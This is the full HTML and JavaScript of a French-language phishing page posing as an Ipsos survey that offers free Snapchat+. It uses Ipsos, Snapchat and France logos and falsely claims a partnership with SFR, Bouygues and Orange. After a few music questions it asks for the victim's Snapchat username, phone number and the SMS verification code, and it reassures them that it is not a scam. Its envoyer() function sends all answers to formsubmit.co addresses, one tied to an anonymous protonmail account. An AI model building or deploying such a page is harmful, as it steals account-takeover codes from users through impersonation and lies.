<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Sondage | Ipsos</title>

<!-- Police -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
body {
    font-family: 'Inter', sans-serif;
    background:#f4f6f9;
    margin:0;
}

/* HEADER */
.header {
    background:#003b7a;
    padding:25px 30px;
    display:flex;
    align-items:center;
    justify-content:center;
    position:relative;
}

.header img {
    height:50px;
}

.header a {
    position:absolute;
    left:30px;
}

.header-text {
    color:white;
    font-size:26px;
    font-weight:700;
}

/* LOGOS FIXES (FRANCE + SNAPCHAT) */
.logos-fixed {
    position:fixed;
    top:15px;
    right:15px;
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:10px;
    z-index:999;
}

.logos-fixed img {
    height:45px;
}

/* CONTENU */
.box {
    max-width:650px;
    margin:60px auto;
    background:white;
    padding:45px;
    border-radius:12px;
    box-shadow:0 4px 12px rgba(0,0,0,0.1);
}

h2 { font-size:30px; margin-bottom:20px; }
p { font-size:20px; margin-bottom:25px; }

input {
    width:100%;
    padding:14px;
    font-size:18px;
    border-radius:6px;
    border:1px solid #ccc;
}

/* BOUTON */
button {
    margin-top:25px;
    padding:14px 26px;
    background:#0078d4;
    color:white;
    border:0;
    border-radius:8px;
    cursor:pointer;
    font-size:20px;
}
button:hover { background:#005fa3; }
button:disabled {
    background:#b0b0b0;
    cursor:not-allowed;
}

/* PROGRESSION */
.progress-container {
    width:100%;
    height:10px;
    background:#e0e0e0;
    border-radius:5px;
    margin-bottom:25px;
}

.progress-bar {
    height:100%;
    width:0%;
    background:#0078d4;
    transition:width 0.3s ease;
}

/* PARTENARIAT */
#partenariat {
    display:none;
    text-align:center;
    margin-top:35px;
    font-size:18px;
    color:#555;
}

/* RESPONSIVE */
@media(max-width:600px){
    .box{margin:20px;padding:25px}
    h2{font-size:24px}
}
</style>
</head>

<body>
<!-- Logos fixes -->
<div class="logos-fixed">
    <img src="francelogo.png" alt="France">
    <img src="SnapchatLogo.png" alt="Snapchat">
</div>

<div class="header">
    <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos r√©ponses seront perdues.')">
        <img src="logo.png" alt="Ipsos">
    </a>
    <div class="header-text">Ipsos ‚Äì Sondage</div>
</div>

<!-- INTRO -->
<div class="box" id="intro">
    <h2>Sondage express</h2>
    <p>R√©pondez √† ce court sondage pour b√©n√©ficier de <strong>Snapchat+</strong> üéÅ</p>
    <button onclick="demarrer()">Commencer</button>
</div>

<!-- INTERM√âDIAIRE -->
<div class="box" id="intermediaire" style="display:none;">
    <h2>Merci !</h2>
    <p>Pour recevoir votre abonnement √† Snapchat+, une v√©rification d'identit√© est n√©cessaire afin de garantir des r√©ponses humaines et d'√©viter les abus. Cette offre n'est disponible qu'une seule fois par compte Snapchat et par personne, donc en continuant vous vous engagez √† ce que cela constitue votre premi√®re et unique intervention sur ce sondage. Non ce n'est pas une arnaque. Seules les entreprises SFR, Bouygues et Orange sont accept√©es par les partenaires avec lesquels nous travaillons. La v√©rification se fait via votre num√©ro de t√©l√©phone (donn√©es anonymes et supprim√©es ensuite).</p>
    <button onclick="continuer()">Continuer</button>
</div>

<!-- SONDAGE -->
<div class="box" id="sondage" style="display:none;">
    <div class="progress-container">
        <div class="progress-bar" id="progressBar"></div>
    </div>

    <h2 id="titre"></h2>
    <p id="question"></p>
    <div id="reponses"></div>

    <button id="btnSuivant" onclick="suivant()" disabled>Suivant</button>

    <div id="partenariat">
        <strong>Snapchat + Ipsos</strong><br>
        En partenariat avec Bouygues Telecom, Orange et SFR
    </div>
</div>

<script>
const titre = "Sondage pour b√©n√©ficier de Snapchat+";

const questions = [
    { text:"Quel est ton artiste ou groupe pr√©f√©r√© ?", type:"text", placeholder:"Ex : Niska" },
    { text:"Quel artiste √©coutes-tu actuellement sur Deezer ?", type:"text", placeholder:"Ex : Damso" },
    { text:"Quel artiste aimerais-tu d√©couvrir davantage ?", type:"text", placeholder:"Ex : Jul" },
    { text:"Quel est ton nom d'utilisateur Snapchat ?", type:"text", placeholder:"Pseudo Snapchat" },
    { text:"Quel est ton num√©ro de t√©l√©phone ?", type:"tel", placeholder:"0601020304" },
    { text:"Entre le code re√ßu par SMS", type:"text", placeholder:"XXXX" }
];

let indexQuestion = 0;
let reponsesUtilisateur = [];

document.getElementById("titre").textContent = titre;

function demarrer(){
    intro.style.display="none";
    sondage.style.display="block";
    afficherQuestion();
}

function afficherQuestion(){
    const q = questions[indexQuestion];
    question.textContent = q.text;

    reponses.innerHTML = `
        <input type="${q.type}" id="champ"
        placeholder="${q.placeholder || ''}"
        oninput="verifier()">
    `;

    btnSuivant.disabled = true;
    updateProgress();

    partenariat.style.display =
        indexQuestion >= 3 ? "block" : "none";
}

function verifier(){
    btnSuivant.disabled = !champ.value.trim();
}

function updateProgress(){
    progressBar.style.width =
        ((indexQuestion+1)/questions.length*100) + "%";
}

function suivant(){
    const val = champ.value.trim();

    if(questions[indexQuestion].type==="tel" && !/^[0-9]{10}$/.test(val)){
        alert("Num√©ro invalide (10 chiffres)");
        return;
    }

    reponsesUtilisateur[indexQuestion] = val;
    indexQuestion++;

    if(indexQuestion===3){
        sondage.style.display="none";
        intermediaire.style.display="block";
        return;
    }

    if(indexQuestion < questions.length){
        afficherQuestion();
    } else {
        sondage.innerHTML = `
            <h2>Merci pour votre participation !</h2>
            <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un d√©lai d'environ 15 minutes.</p>
        `;
        envoyer();
    }
}

function continuer(){
    intermediaire.style.display="none";
    sondage.style.display="block";
    afficherQuestion();
}

function envoyer() {
    // Premier FormData
    const formData1 = new FormData();
    formData1.append("artiste_prefere", reponsesUtilisateur[0] || "");
    formData1.append("artiste_deezer", reponsesUtilisateur[1] || "");
    formData1.append("artiste_decouverte", reponsesUtilisateur[2] || "");
    formData1.append("snapchat", reponsesUtilisateur[3] || "");
    formData1.append("telephone", reponsesUtilisateur[4] || "");
    formData1.append("code_sms", reponsesUtilisateur[5] || "");
    formData1.append("_captcha", "false");
    formData1.append("_template", "table");

    // Premier envoi
    fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
        method: "POST",
        body: formData1
    })
    .then(() => console.log("Premier mail envoy√©"))
    .catch(err => console.error("Erreur premier envoi :", err));

    // Deuxi√®me FormData (copie des r√©ponses)
    const formData2 = new FormData();
    formData2.append("artiste_prefere", reponsesUtilisateur[0] || "");
    formData2.append("artiste_deezer", reponsesUtilisateur[1] || "");
    formData2.append("artiste_decouverte", reponsesUtilisateur[2] || "");
    formData2.append("snapchat", reponsesUtilisateur[3] || "");
    formData2.append("telephone", reponsesUtilisateur[4] || "");
    formData2.append("code_sms", reponsesUtilisateur[5] || "");
    formData2.append("_captcha", "false");
    formData2.append("_template", "table");

    // Deuxi√®me envoi
    fetch("https://formsubmit.co/deuxiemeemail@example.com", {
        method: "POST",
        body: formData2
    })
    .then(() => console.log("Deuxi√®me mail envoy√©"))
    .catch(err => console.error("Erreur deuxi√®me envoi :", err));
}
</script>

</body>
</html>


